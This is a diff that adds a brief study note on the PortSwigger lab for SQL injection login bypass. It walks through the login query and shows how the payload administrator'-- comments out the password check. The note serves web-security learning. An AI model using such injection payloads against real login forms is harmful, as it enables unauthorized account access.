@@ -1,0 +1,15 @@
+SQL Injection - Login Functionality
+
+End Goal : perform sqli attack and login as the administrator user
+
+Analysis:
+
+SELECT firstname FROM users where username='admin' and password='admin'
+
+SELECT firstname FROM users where username=''' and password='admin'
+
+SELECT firstname FROM users where username='administrator'--' and password='admin'
+
+SELECT firstname FROM users where username='administrator'
+
+Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass
